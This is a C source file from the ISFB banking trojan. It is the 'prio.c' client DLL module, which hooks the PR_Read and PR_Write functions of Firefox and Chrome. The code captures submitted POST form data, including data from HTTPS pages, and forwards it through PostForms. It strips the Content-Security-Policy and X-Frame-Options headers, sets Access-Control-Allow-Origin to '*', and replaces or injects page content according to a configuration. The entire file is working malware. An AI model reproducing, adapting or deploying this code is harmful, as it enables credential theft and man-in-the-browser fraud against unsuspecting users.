//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: prio.c
// $Revision: 400 $
// $Date: 2014-11-17 19:08:31 +0300 (Пн, 17 ноя 2014) $
// description:
//	ISFB client DLL. 
//	PR IO interface comatible engine, common for FF and CHROME.

#include "..\common\common.h"
#include "..\crm.h"
#include "transfer.h"
#include "parser.h"
#include "http.h"
#include "prio.h"

// g_Original PR API
PRAPI	g_Original = {0};


// BlockingRead() flags
#define		BR_BLOCK	1		// Wait until data read
#define		BR_EXACT	2		// Wait until exact amount of specified bytes read

#define		BR_TIMEOUT	500		// millisectonds


//
//	Queries and checks specified request's URL. Creates a HANDLE_CONTEXT if the URL matches config settings.
//
static PHANDLE_CONTEXT	FfCheckAddHandle(
	HANDLE			Handle,		//	handle of a HTTP request to check
	PHTTP_HEADERS	Headers,	//	pointer to HTTP_HEADERS structure for the specfied request
	ULONG			Flags,		//	a combination of CF_XXX flags
	BOOL			IsSsl		//	TRUE if this is an SSL connection
	)
{
	PHANDLE_CONTEXT	Ctx = NULL;
	ULONG	Status;
	PVOID	tCtx = NULL;
	LPSTR	Referer = NULL;

	ASSERT_HTTP_HEADERS(Headers);
	ASSERT(Headers->Url);

	// Looking for referer header
	if (Headers->pReferer && Headers->RefererSize)
	{
		// Allocating and copying referer string
		if (Referer = hAlloc(Headers->RefererSize + sizeof(CHAR)))
		{
			memcpy(Referer, Headers->pReferer, Headers->RefererSize);
			Referer[Headers->RefererSize] = 0;
		}
	}

	Status = ConfigCheckInitUrl(Headers->Url, Referer, IsSsl, &tCtx);
	if ((Status || (Flags & CF_FORM)) && (Status != URL_STATUS_POST_BLOCK) && (Ctx = AddHandle(Handle)))
	{
		// Saving the URL for future use
		if (Ctx->Url)
		{
			// Handle seems to be reused, releasing URL
			hFree(Ctx->Url);
			Ctx->cTotal = 0;
			Ctx->cActive = 0;
			Ctx->Flags = Flags;
		}
		else
		{
			ASSERT(Ctx->Flags == 0);
		}

		if (Ctx->tCtx)
		{
			TransferReleaseContext(Ctx->tCtx);
			hFree(Ctx->tCtx);
			Ctx->tCtx = NULL;
		}

		Ctx->tCtx = tCtx;
		Ctx->Url = Headers->Url;

		if (Status == URL_STATUS_REPLACE)
			Ctx->Flags |= CF_REPLACE;
		else if (Status == URL_STATUS_BLOCK)
			Ctx->Status = REQUEST_BLOCKED;
		else 
		{
			if (Status == URL_STATUS_UNDEF)
			{
				ASSERT(Flags & CF_FORM);
				Ctx->Flags = CF_FORM;
			}
			Ctx->Status = UNKNOWN_STATUS;
		}

		Headers->Url = NULL;
	}	// if ((Status || (Flags & CF_FORM)) && (Ctx = AddHandle(Handle)))
	
	if (Referer)
		hFree(Referer);

	return(Ctx);
}


//
//	Reads specified amount of data from the socket. In case of no data will wait until it appears or any error occures.
//	Returns number of bytes accually read.
//
static LONG	BlockingRead(
	PPR_SOCKET	Ps,		// socket handle
	PCHAR		Buffer,	// buffer to read to
	LONG		Length,	// number of bytes to read
	ULONG		Flags	// one or more BR_XXX flags
	)
{
	LONG	Timeout = 0, bRead, Total = 0;
	while(Length)
	{
		bRead = (Ps->Api->Read)(Ps->fd, (Buffer + Total), Length, NULL);
		if (bRead <= 0)
		{
			if (!(Flags & BR_EXACT) && Total)
				break;

			if (bRead == -1 && (Ps->Api->GetError)(Ps->Context) == PR_WOULD_BLOCK_ERROR && Timeout < BR_TIMEOUT)
			{
				// no data now, waiting 
				Sleep(100);
				if (!(Flags & BR_BLOCK))
					Timeout += 100;

				continue;
			}
			// an error occured or the connection is closed, exiting
			break;
		}	// if (bRead <= 0)
		Length -= bRead;
		Total += bRead;
	}	// while(Length)
	return(Total);
}


//
//	This function reads chunked data from the specified PR-socket. And writes it to the specfied PR-context.
//	It returns one of the following codes:
//		>0	- a chunk completely read
//		0	- connection was closed
//		<0	- an error occured while reading a chunk
//
static LONG	ContextLoadChunk(
	PPR_SOCKET		Ps,		// PR-socket to read data from
	PHANDLE_CONTEXT Ctx		// PR-context to load data to
	)
{
	HRESULT	hResult;
	LONG	cSize = 0, bRead = 0;
	PCHAR	pChunk = NULL, ChunkBuffer;

	ASSERT(Ctx->cActive);

	ChunkBuffer = (Ctx->cBuffer + (Ctx->cTotal - Ctx->cActive));

	if (Ctx->ChunkSize)
	{
		// We have a chunk started, continue
		if (Ctx->cActive < Ctx->ChunkSize)
		{
			//	Buffer contains only a part of chunk data, copying it
			bRead = Ctx->cActive;
			hResult = CoInvoke(Ctx->pReceiveStream, Write, ChunkBuffer, bRead, NULL);
			Ctx->cActive = 0;
			Ctx->ChunkSize -= bRead;

			// Trying to read some more chunk data.
			bRead = (Ps->Api->Read)(Ps->fd, Ctx->cBuffer, MAX_CONTENT_BUFFER_SIZE, 0);
			if (bRead > 0)
			{
				Ctx->cTotal = Ctx->cActive = bRead;
				bRead = ContextLoadChunk(Ps, Ctx);
			}
		}
		else	// if (Ctx->cActive < Ctx->ChunkSize)
		{
			// Buffer contains more then one part of chunk data
			bRead = Ctx->ChunkSize;
			hResult = CoInvoke(Ctx->pReceiveStream, Write, ChunkBuffer, bRead, NULL);
			Ctx->cActive -= bRead;
			Ctx->ChunkSize -= bRead;

			ASSERT(Ctx->ChunkSize == 0);
		}	// else	// if (Ctx->cActive < Ctx->ChunkSize)
	}
	else	// if (Ctx->ChunkSize)
	{
		// Reading new chunk
		ASSERT(!(Ctx->Flags & CF_LENGTH));
		ASSERT(Ctx->Flags & CF_CHUNKED);

		// Looking for the chunk header within the buffer
		if (pChunk = HttpGetChunk(ChunkBuffer, &cSize))
		{
			Ctx->cActive -= (LONG)(pChunk - ChunkBuffer);
			ASSERT(Ctx->cActive >= 0);
			Ctx->ChunkSize = cSize + cstrlen(szCRLF);

			if (!Ctx->cActive && cSize)
			{
				// We have a chunk size but no chunk data. Trying to read some data.
				bRead = (Ps->Api->Read)(Ps->fd, Ctx->cBuffer + Ctx->cActive, (MAX_CONTENT_BUFFER_SIZE - Ctx->cActive), 0);
				if (bRead > 0)
					Ctx->cTotal = Ctx->cActive = bRead;
			}	// if (!Ctx->cActive && cSize)
			
			if (Ctx->cActive)
			{
				// There's some chunk data within the buffer
				bRead = ContextLoadChunk(Ps, Ctx);
			}	// if (Ctx->cActive)
		}
		else	// if (pChunk = HttpGetChunk(ChunkBuffer, &cSize))
		{		
			// No chunk found, possibly we have only a part of the chunk header
			ASSERT(Ctx->ChunkSize == 0);

			if (Ctx->cActive < Ctx->cTotal)
			{
				if (Ctx->cActive)
					memcpy(Ctx->cBuffer, ChunkBuffer, Ctx->cActive);

				// Loading other part of the chunk header
				bRead = (Ps->Api->Read)(Ps->fd, Ctx->cBuffer + Ctx->cActive, (MAX_CONTENT_BUFFER_SIZE - Ctx->cActive), 0);

				if (bRead > 0)
				{
					Ctx->cTotal = Ctx->cActive + bRead;
					Ctx->cActive = Ctx->cTotal;
					bRead = ContextLoadChunk(Ps, Ctx);
				}
			}	// if (Ctx->cActive < Ctx->cTotal)
			else
			{
				// There's a broken chunk sequence
				ASSERT(FALSE);
				bRead = 0;
			}
		}	// else // if (pChunk)
	}	// else	// if (Ctx->ChunkSize)

	return(bRead);
}


//
//	Appends the specified data to the end of the specified stream.
//	Doesn't change current stream position.
//
static VOID StreamAddData(
	LPSTREAM	pStream,	// stream to append
	PCHAR		pBuffer,	// buffer containing data to write to the stream
	ULONG		Size		// size of the buffer in bytes
	)
{
	ULONG	OldPos;
	HRESULT	hResult;

	OldPos = StreamGetPos(pStream);
	StreamGotoEnd(pStream);

	hResult = CoInvoke(pStream, Write, pBuffer, Size, NULL);
	ASSERT(hResult == S_OK);

	StreamGoto(pStream, OldPos);
}


//
//	Reads data from a socket until whole HTTP header received, of the buffer is full, or any error occured.
//	Returns size of loaded HTTP headers in bytes.
//
static ULONG BlockingReadHeaders(
	PPR_SOCKET		Ps,		// socket handle
	PHANDLE_CONTEXT	Ctx,	// current handle Context to read the data to
	BOOL			Block	// infinitely wait for data if set
	)
{
	LONG	bRead;
	ULONG	Length = 0, Attempt = 0;
	PCHAR	cStr = NULL;

	ASSERT(HttpIsReply(Ctx->cBuffer, Ctx->cTotal));

	while(!(cStr = StrStr(Ctx->cBuffer, szEmptyStr)))
	{
		if (Ctx->cTotal == MAX_CONTENT_BUFFER_SIZE)
			break;

		DbgPrint("ISFB_%04x: Blocking read headers.\n", g_CurrentProcessId);

		bRead = Ps->Api->Read(Ps->fd, Ctx->cBuffer + Ctx->cTotal, MAX_CONTENT_BUFFER_SIZE - Ctx->cTotal, NULL);
		if (bRead <= 0)
		{
			if (bRead == -1 && Ps->Api->GetError(&Ps->Context) == PR_WOULD_BLOCK_ERROR && Attempt < MAX_LOAD_ATTEMPTS)
			{
				// no data now, waiting 
				Sleep(10);
				if (!Block)
					Attempt += 1;
				continue;
			}
			// an error occured or the connection is closed, exiting
			break;
		}	// if (bRead <= 0)

		Ctx->cTotal += bRead;
		Ctx->cActive += bRead;		
		Ctx->cBuffer[Ctx->cTotal] = 0;
	}	// while(

	if (cStr)
		Length = cstrlen(szEmptyStr) + (ULONG)(cStr - Ctx->cBuffer);

	return(Length);
}


//
//	Copies all data from pDataStream into pStream as single HTTP chunk, including chunk size and chunk-end sequence.
//
static VOID ContextAddChunk(
	PHANDLE_CONTEXT	Ctx
	)
{
	LONG	HeaderSize, bSize;
	ULONG	OldPos;
	CHAR	ChunkHeader[0x80] = {0};
	HRESULT	hResult;
	LPSTREAM	pStream = Ctx->pStream;
	LPSTREAM	pDataStream = Ctx->pReceiveStream;

	ASSERT(Ctx->Flags & CF_CONTENT);

	bSize = StreamGetLength(pDataStream);

	ASSERT(bSize >= cstrlen(szCRLF) || !(Ctx->Flags & CF_CHUNKED));

	if (Ctx->Flags & CF_CHUNKED)
		bSize -= cstrlen(szCRLF);

	// Saving current stream position
	OldPos = StreamGetPos(pStream);
	// Will write to the end of the stream
	StreamGotoEnd(pStream);

	// Writing chunk size to the main sream
	HeaderSize = wsprintf(ChunkHeader, szChunkSize, bSize);
	hResult = CoInvoke(pStream, Write, ChunkHeader, HeaderSize, NULL);
	ASSERT(hResult == S_OK);

	if (bSize)
	{
		// Copying data sream content into the main stream
		StreamGotoBegin(pDataStream);
		hResult = StreamCopyStream(pStream, pDataStream, bSize);
		ASSERT(hResult == S_OK);
	}
	else
		// This is the last chunk. Disabling parser.
		Ctx->Flags &= ~CF_CONTENT;

	// Writing the end of chunk CRLF sequence to the end of the stream
	hResult = CoInvoke(pStream, Write, szCRLF, cstrlen(szCRLF), NULL);
	ASSERT(hResult == S_OK);

	// Restoring stream original position
	StreamGoto(pStream, OldPos);
	// Clearing the data stream
	StreamClear(pDataStream);
}


//
//	Searches for HTTP-headers within the specified context buffer.
//	Parses HTTP headers.
//
static VOID ContextParseHeaders(
	PPR_SOCKET	Ps,
	PHANDLE_CONTEXT	Ctx
	)
{
	HRESULT	hResult;	
	LPSTREAM pStream = Ctx->pStream;
	LPSTREAM pDataStream = Ctx->pReceiveStream;
	PHTTP_HEADERS	Headers = NULL;
	ULONG	SizeOfHeaders = 0;

	ASSERT(Ctx->cActive);
	ASSERT(Ctx->cActive == Ctx->cTotal);

	// Checking for HTTP reply headers, and avaliability of CRLF sequence
	// Currently only standard CRLF-devided headers are supported
	if (HttpIsReply(Ctx->cBuffer, Ctx->cTotal) && StrStrI(Ctx->cBuffer, szCRLF))
		// Loading data until we have whole HTTP header read, or buffer is full, or any error occured.
		SizeOfHeaders = BlockingReadHeaders(Ps, Ctx, TRUE);
	
	ASSERT(SizeOfHeaders <= MAX_CONTENT_BUFFER_SIZE);

	// Check out HTTP headers: we assume we have enough space to completely receive all headers.
	if (SizeOfHeaders && (Headers = HttpParseHeaders(Ctx->cBuffer, SizeOfHeaders)))
	{				
		PCHAR ContentType = HttpFindHeaderA(Headers->Binary, szContentType, NULL);

		Ctx->Flags = (Ctx->Flags & CF_REPLACE) | Headers->Flags;
		Ctx->Length = 0;

		// Check if the content should be completely replaced...
		if ((Ctx->Flags & CF_REPLACE) || 
			// ... or check out the content type
			((ContentType) && CheckContentType(ContentType)))
		{						
			PCHAR	nBuffer;
			ULONG	nSize;

			Ctx->Flags |= CF_CONTENT;
		
			ASSERT(Headers->HeadersSize <= Ctx->cTotal);
			Ctx->cActive = (Ctx->cTotal - Headers->HeadersSize);

			// Clear main data stream
			StreamClear(Ctx->pStream);
			// Clear content load stream
			StreamClear(Ctx->pReceiveStream);
			// Clear content grab stream
			StreamClear(Ctx->pStream1);

			// Removing "Content-Security-Policy" header
			if (nBuffer = HttpSetHeaderA(Headers->Binary, szSecPolicy, NULL, NULL))
			{
				hFree(Headers->Binary);
				Headers->Binary = nBuffer;
			}

			// Removing "X-Frame-Options" header
			if (nBuffer = HttpSetHeaderA(Headers->Binary, szXFrameOptions, NULL, NULL))
			{
				hFree(Headers->Binary);
				Headers->Binary = nBuffer;
			}

			// Looking for "Access-Control-Allow-Origin" header
			if (StrStrI(Headers->Binary, szAccessCtrlOrigin))
			{
				// Setting "Access-Control-Allow-Origin" value to "*"
				if (nBuffer = HttpSetHeaderA(Headers->Binary, szAccessCtrlOrigin, "*", NULL))
				{
					hFree(Headers->Binary);
					Headers->Binary = nBuffer;
				}
			}	// if (StrStrI(Headers->Binary, szAccessCtrlOrigin))

			// Check out if the content is not chunked or the page should be completely replaced
			if (!(Ctx->Flags & CF_CHUNKED) || (Ctx->Flags & CF_REPLACE))
			{
				ASSERT(!(Ctx->Flags & CF_CHUNKED) || !(Ctx->Flags & CF_LENGTH));
				
				// Checking if the page content will be replaced
				if (Ctx->Flags & CF_REPLACE)
				{					
					// Loading HTTP headers of the page to replace with
					if (GetReplaceHeaders(Ctx->tCtx, &nBuffer, &nSize) == NO_ERROR)
					{
						hFree(Headers->Binary);
						Headers->Binary = nBuffer;
						Headers->HeadersSize = nSize;
					}	// if (GetReplaceHeaders(Ctx->tCtx, &nBuffer, &nSize) == NO_ERROR)
					Ctx->Flags &= ~(CF_CHUNKED | CF_LENGTH);
					Ctx->ChunkSize = 1;
				}	// if (Ctx->Flags & CF_REPLACE)
				else
				{
					if (Ctx->Flags & CF_LENGTH)
					{
						// Content has specified length
						if ((Ctx->ChunkSize = Headers->ContentSize) == 0)
							// There's no HTTP content, nothing to process
							Ctx->Flags = 0;
					}
					else
						// There's no content length specified
						// Setting ChunkSize to indicate that we gonna continue loading data until the connection is closed.
						Ctx->ChunkSize = 1;
				}

				if (Ctx->Flags & CF_CONTENT)
				{
					// Setting "Transfer-encoding: chunked" header
					if (nBuffer = HttpSetHeaderA(Headers->Binary, szTransferEncoding, szChunked, NULL))
					{
						hFree(Headers->Binary);
						Headers->Binary = nBuffer;
					}

					// Removing "Content-length" header
					if (nBuffer = HttpSetHeaderA(Headers->Binary, szContentLength, NULL, NULL))
					{
						hFree(Headers->Binary);
						Headers->Binary = nBuffer;
					}

					// "Transfer-encoding: chunked" avaliable from HTTP version 1.1 only and version 1.0 will ignore it,
					//	so we have to replace HTTP version in reply to support chunked.
					ASSERT(Headers->Binary[5] == '1' && Headers->Binary[6] == '.');
					Headers->Binary[7] = '1';
				}	// if (Ctx->Flags & CF_CONTENT)
			}	// if (Ctx->Flags & CF_LENGTH)
			else
				// Content has no length specified
				Ctx->ChunkSize = 0;
#if _DEBUG 
			if (Ctx->pHeaders = hAlloc(Headers->HeadersSize + 1))
			{
				memcpy(Ctx->pHeaders, Headers->Binary, Headers->HeadersSize);
				Ctx->pHeaders[Headers->HeadersSize] = 0;
			}
#endif

			// Writing HTTP headers to the main stream
			hResult = CoInvoke(pStream, Write, Headers->Binary, lstrlen(Headers->Binary), NULL);
			ASSERT(hResult == S_OK);
			StreamGotoBegin(pStream);
		}	// if ((ContentType) && 
		else
			// Reseting context flags. We not gonna process it.
			Ctx->Flags = 0;

		HttpReleaseHeaders(Headers);
	}	// if (SizeOfHeaders && (Headers = HttpParseHeaders(Ctx->cBuffer, SizeOfHeaders)))
}


//
//	Receives the specified context data.
//
static LONG ContextReceive(
	PPR_SOCKET		Ps,	// PR-socket handle
	PHANDLE_CONTEXT	Ctx	// PR-context
	)
{
	LONG	bSize = 1;
	HRESULT	hResult;	

	if (Ctx->cActive || (Ctx->Flags & CF_REPLACE))
	{
		if (Ctx->Flags & CF_CONTENT)
		{
			if (Ctx->Flags & (CF_CHUNKED | CF_LENGTH))
			{	
				// Content either chunked or has a specified length
				bSize = ContextLoadChunk(Ps, Ctx);
			}
			else
			{
				// Content is not chunked and has no length specified, loading until the connection is closed
				ASSERT(Ctx->ChunkSize == 1);
			
				bSize = -1;
				while(Ctx->cActive)
				{
					hResult = CoInvoke(Ctx->pReceiveStream, Write, (Ctx->cBuffer + (Ctx->cTotal - Ctx->cActive)), Ctx->cActive, &bSize);
					ASSERT(hResult == S_OK);

					Ctx->cTotal = (Ps->Api->Read)(Ps->fd, Ctx->cBuffer, MAX_CONTENT_BUFFER_SIZE, 0);

					if (Ctx->cTotal > 0)
						Ctx->cActive = Ctx->cTotal;
					else
					{
						if (Ctx->cTotal == 0)
							// Connection is closed.
							Ctx->ChunkSize = 0;
						Ctx->cActive = Ctx->cTotal = 0;
					}
				}	// while(Ctx->cActive)
			}	// else	// if (Ctx->Flags & (CF_CHUNKED | CF_LENGTH))

			if (bSize >= 0 || (Ctx->Flags & CF_REPLACE))
			{
				// Parsing received data stream
				ASSERT(!(Ctx->Status & STREAM_FULL_REPLACE));
				Ctx->Status = ConfigProcessStream(Ctx->pReceiveStream, Ctx->pStream1, Ctx->Url, (Ps->Flags & PR_SOCKET_FLAG_SSL), Ctx->tCtx);

				// Adding received stream to the main stream as a chunk
				// Do not add a NULL-chunk if there is something left to read (i.e. Ctx->ChunkSize != 0)
				if (StreamGetLength(Ctx->pReceiveStream) || Ctx->ChunkSize == 0)
					ContextAddChunk(Ctx);

				if ((Ctx->Status & STREAM_FULL_REPLACE) || (!(Ctx->Flags & CF_CHUNKED) && Ctx->ChunkSize == 0))
				{
					// Adding NULL-chunk
					ASSERT(StreamGetLength(Ctx->pReceiveStream) == 0);
					ContextAddChunk(Ctx);
				}
			}	// if (bSize > 0)
		}
		else	// 	if (Ctx->Flags & CF_CONTENT)
		{
			//  Wrong content type
			ASSERT(Ctx->cTotal > 0);
			ASSERT(Ctx->cActive > 0);

			StreamAddData(Ctx->pStream, Ctx->cBuffer + (Ctx->cTotal - Ctx->cActive), Ctx->cActive);
			Ctx->cActive = 0;
		}	// else	// if (Ctx->Flags & CF_CONTENT)
	}	// if (Ctx-cActive)

	return(bSize);
}


//
//	Copies received data from the receive stream into the user-specified buffer.
//	Returns number of bytes copied to the buffer.
//
static LONG ContextDispatch(
	PPR_SOCKET		Ps,		// PR-socket handle
	PHANDLE_CONTEXT	Ctx,	// PR-context
	PCHAR			pBuffer,// pointer to a buffer to copy data
	LONG			Size	// size of the buffer in bytes
	)
{
	LONG	bSize, bRead = 0;
	HRESULT	hResult;

	if (bSize = StreamAvaliable(Ctx->pStream))
	{
		if ((Ctx->Status & STREAM_FULL_REPLACE) && (bSize < Size))
			// Loading all data from the socket
			while((bRead = BlockingRead(Ps, Ctx->cBuffer, MAX_CONTENT_BUFFER_SIZE, 0)) > 0);

		// Read 'amount' of bytes from the stream and return'em to the caller
		hResult = CoInvoke(Ctx->pStream, Read, pBuffer, Size, (PULONG)&bRead);
		ASSERT(hResult == S_OK);
		ASSERT(bRead > 0);
		// If the end of the stream reached - clear it.
		if (bSize == bRead)
			StreamClear(Ctx->pStream);
	}	// if (bSize = StreamGetLength(Ctx->pStream))

	return(bRead);
}


// ------ Hook functions ------------------------------------------------------------------------------------------------


//
//	Common PR_Read dispatch function.
//
LONG PRIO_Read(
	PPR_SOCKET	Ps,		// socket handle
	PCHAR		buf,	// buffer to store the bytes read
	LONG		amount	// number of bytes to read
	)
{
	LONG	bRead = 0;
	PHANDLE_CONTEXT Ctx;

//	DbgPrint("Thread %x entered PR_Read with handle 0x%x.\n", GetCurrentThreadId(), fd);

	if ((Ctx = FindHandle(Ps->fd)) && (!(Ctx->Flags & CF_FORM) || !ReleaseHandle(Ctx)))
	{
		ASSERT(!(Ctx->Flags & CF_FORM));

		do	// not a loop
		{	
			if (Ctx->Status & STREAM_FULL_REPLACE)
			{
				// Stream has already being replaced
				// It's may happen, that there is some data is still ready on a wire, so we have to read it here
				while ((bRead = (Ps->Api->Read)(Ps->fd, buf, amount, NULL)) > 0);
				// Clearing number of bytes read to be able to read from the replaced stream later
				bRead = 0;
				break;
			}

			// Stream is empty, reading data from the socket
			if (Ctx->cActive == 0) 
			{
				if ((Ctx->Flags & CF_LENGTH) && (Ctx->ChunkSize == 0))
				{
					// Context has lengh and we have read it all
					ASSERT(bRead == 0);
					if (StreamAvaliable(Ctx->pStream))
						break;
				}

				// Buffer is empty
				// Reading the data currently available on the socket
				if ((bRead = (Ps->Api->Read)(Ps->fd, Ctx->cBuffer, MAX_CONTENT_BUFFER_SIZE, NULL)) <= 0)
				{
					if (bRead == 0 && Ctx->ChunkSize != 0)
					{
						// Connection is closed. Loading complete, adding NULL-chunk.
						ASSERT(StreamGetLength(Ctx->pReceiveStream) == 0);
						ContextAddChunk(Ctx);
						Ctx->ChunkSize = 0;
					}
					break;
				}

				Ctx->cTotal = bRead;
				Ctx->cActive = bRead;
				Ctx->cBuffer[Ctx->cTotal] = 0;	// to make a zero-terminated string

				if (!(Ctx->Flags & CF_CONTENT))
					// Looking for HTTP request headers and parsing them
					ContextParseHeaders(Ps, Ctx);
			}
			else	// if (Ctx->cActive == 0)
			{
				ASSERT(!(Ctx->Flags & CF_LENGTH));
				ASSERT(Ctx->cActive < Ctx->cTotal);
			}

			// Writing data into the context stream
			bRead = ContextReceive(Ps, Ctx);

		} while (FALSE);

		// Reading data from the context stream into the buffer
		if (StreamAvaliable(Ctx->pStream))
		{
			bRead = ContextDispatch(Ps, Ctx, buf, amount);

			if (!(Ctx->Flags & CF_CONTENT) && !StreamAvaliable(Ctx->pStream))
				ReleaseHandle(Ctx);
		}

		ReleaseHandle(Ctx);		
//		DbgPrint("PRIO_Read ended with status %d, error code %d\n", bRead, (Ps->Api->GetError)(Ps->Context));
	}
	else	// if ((Ctx = FindHandle(Ps->fd)) &&...
	{
		bRead = (Ps->Api->Read)(Ps->fd, buf, amount, NULL);
	}

//	DbgPrint("Thread %x left PR_Read with status %d.\n", GetCurrentThreadId(), bRead);
	return(bRead);
}


//
//	Common PR_Write dispatch function.
//	Checks if the specified request has to be handled, initiates any replace-data receive and sends HTTP-form data.
//
LONG PRIO_Write(
	PPR_SOCKET	Ps,		// socket handle
	PCHAR		buf,	// buffer containing data to write
	LONG		amount	// number of bytes to write
	)
{
	LONG	bRet = 0, bSize = 0;
	PCHAR	nBuffer;
	PHANDLE_CONTEXT Ctx = NULL;
	PHTTP_HEADERS	Headers = NULL;


	do	// not a loop
	{	
		if (amount == 0)
			break;

		if (!HttpIsRequest(buf, amount))
		{
			Ctx = FindHandle(Ps->fd);
			break;
		}

		if (!(nBuffer = StrStrNA(buf, szEmptyStr, amount)))
			break;

		ASSERT(nBuffer >= buf && (nBuffer < (buf + amount)));
	
		if (!(Headers = HttpParseHeaders(buf, (cstrlen(szEmptyStr) + (ULONG)(nBuffer - buf)))))
			break;

		if (!g_UserAgentStr)
			ActivateParser(HttpQueryAgent(Headers));

		if (!(Headers->Url = HttpQueryUrl(Headers, (Ps->Flags & PR_SOCKET_FLAG_SSL))))
			break;

		if ((g_ClientId.Plugins & PG_BIT_FORMS) || 
#ifdef _ALWAYS_HTTPS
			(Ps->Flags & PR_SOCKET_FLAG_SSL)
#else
			(FALSE)
#endif
			)
		{
			// Collecting and saving POST forms
			if (Headers->ContentSize) //&& ((Headers->ContentSize + Headers->HeadersSize) <= amount))		
			{
				PCHAR ContType = HttpFindHeaderA(Headers->Binary, szContentType, NULL);
				// Checking for Online Certificate Status Protocol (OCSP) request, and ignoring it if found
				if (!StrStrI(ContType, szOCSP))
				{
					// Creating a Context to store form data
					if (Ctx = FfCheckAddHandle(Ps->fd, Headers, CF_FORM, (Ps->Flags & PR_SOCKET_FLAG_SSL)))
						Ctx->Length = Headers->ContentSize;
				}
			}
		}	// if (g_ClientId.Plugins & PG_BIT_FORMS)

		// Checking out the URL
		if (Ctx || (Ctx = FfCheckAddHandle(Ps->fd, Headers, 0, (Ps->Flags & PR_SOCKET_FLAG_SSL))))
		{

			ASSERT((Ctx->Flags & ~(CF_FORM | CF_REPLACE)) == 0);

			if (Ctx->Status == REQUEST_BLOCKED)
			{
				bRet = -1;
				bSize = -1;
				(Ps->Api->SetError)(PR_CONNECT_RESET_ERROR, 0, Ps->Context);
				break;
			}

			if (Ctx->Flags & CF_REPLACE)
			{
#ifdef	_PATCH_REPLACE_HEADERS
				// Checking if this is a GET request
				if (*(PULONG)Headers->Binary == uGET)
					// Patching request URI to make an invalid HTTP request.
					// All request headers and data will be relpaced. We don't need to receive any data there.
					buf[5] = '%';
#endif
			}	// if (Ctx->Flags & CF_REPLACE)
			else
			{
				// Addinig "Accept-Encoding: identity" header
				if (nBuffer = HttpSetHeaderA(Headers->Binary, szAcceptEncoding, szIdentity, NULL))
				{
					hFree(Headers->Binary);
					Headers->Binary = nBuffer;
				}	// if (nBuffer = HttpSetHeaderA(Headers->Binary, szAcceptEncoding, szIdentity))
			}	// else // if (Ctx->Flags & CF_REPLACE)
		}	// if (Ctx || (Ctx = FfCheckAddHandle(fd, Headers, 0, (Ps->Flags & PR_SOCKET_FLAG_SSL))))

		// Checking if headers were modified
		if ((bSize = lstrlenA(Headers->Binary)) != Headers->HeadersSize)
		{
			PCHAR	SendBuffer;
			if (SendBuffer = hAlloc(bSize + amount - Headers->HeadersSize))
			{
				memcpy(SendBuffer, Headers->Binary, bSize);
				memcpy(SendBuffer + bSize, (buf + Headers->HeadersSize), (amount - Headers->HeadersSize));
				bSize += (amount - Headers->HeadersSize);

				if ((bRet = (Ps->Api->Write)(Ps->fd, SendBuffer, bSize, NULL)) > 0)
					bRet = amount;

				hFree(SendBuffer);
			}	// if (SendBuffer = hAlloc(bSize + amount - Headers->HeadersSize))
		}
		else
			bSize = 0;

	} while(FALSE);

	if (bSize == 0)
		// Nothing was sent, doning it now
		bRet = (Ps->Api->Write)(Ps->fd, buf, amount, Ps->Context);

	if ((Ctx) && (Ctx->Length))
	{
		// Checking if data was successfully sent and there was any form data
		if (bRet > 0 || (bRet == -1 && Ps->Api->GetError(&Ps->Context) == PR_WOULD_BLOCK_ERROR))
		{

			HRESULT hResult;
			LONG Sent = amount;
			PCHAR FormData = buf;

			if (Headers)
			{
				Sent -= Headers->HeadersSize;
				FormData += Headers->HeadersSize;

				// Saving request headers to the HTTP context, we need them later while posting a form
				Ctx->pHeaders = Headers->Binary;
				Headers->Binary = NULL;
			}

			Sent = min(Sent, Ctx->Length);

			// Saving form data into the data stream
			hResult = CoInvoke(Ctx->pStream, Write, FormData, Sent, NULL);
			ASSERT(hResult == S_OK);

			// Checking if all form data was successfully transmited
			if ((Ctx->Length -= Sent) == 0)
			{
				// Sending form data to the active host
				Sent = StreamGetLength(Ctx->pStream);
				if (FormData = (PCHAR)hAlloc(Sent))
				{
					StreamGotoBegin(Ctx->pStream);
					hResult = CoInvoke(Ctx->pStream, Read, FormData, Sent, (PULONG)&Sent);
					ASSERT(hResult == S_OK);

					PostForms(Ctx->Url, Ctx->pHeaders, NULL, FormData, Sent, SEND_ID_FORM, TRUE);
					hFree(FormData);
				}
				StreamClear(Ctx->pStream);

				// Form was sent
				if (Ctx->Flags & CF_FORM)
					ReleaseHandle(Ctx);
			}
			ASSERT(Ctx->Length >= 0);
		}	// if (bRet > 0 || (bRet == -1 && Ps->Api->GetError(&Ps->Context) == PR_WOULD_BLOCK_ERROR))
		else
		{
			// Form was not sent, an error occured
			if (Ctx->Flags & CF_FORM)
				ReleaseHandle(Ctx);
		}
	}	// if ((Ctx) && (Ctx->Length))
	
	if (Headers)
		HttpReleaseHeaders(Headers);
	else
	{
		// Releasing Context (only if it was just found)
		if (Ctx)
			ReleaseHandle(Ctx);
	}
	
	return(bRet);
}


LONG PRIO_Poll(
	PRPollDesc *pds, 
	LONG		npds
	)
{
	LONG i, Count = 0;

	for(i=0; i<npds; i++)
	{
		if (pds[i].in_flags & PR_POLL_READ)
		{
			PHANDLE_CONTEXT Ctx;
			if (Ctx = FindHandle(pds[i].fd))
			{
				if (StreamGetLength(Ctx->pStream))
				{
					pds[Count].fd = pds[i].fd;
					pds[Count].in_flags = pds[i].in_flags;
					pds[Count].out_flags = PR_POLL_READ;
					Count += 1;
				}
				ReleaseHandle(Ctx);
			}	// if (Ctx = FindHandle(pds[i]->fd))
		}	// if (pds[i]->in_flags & PR_POLL_READ)
	}	// for(i=0; i<npds; i++)

	return(Count);
}

//
//	Common PR_Close dispatch function.
//
LONG PRIO_Close(
	PPR_SOCKET	Ps	// socket handle
	)
{
	if (DelHandle(Ps->fd))
	{
		//DbgPrint("ISFB_%04x: Handle 0x%x removed from the table.\n", g_CurrentProcessId, fd);
	}
	return((Ps->Api->Close)(Ps->fd, Ps->Context));
}
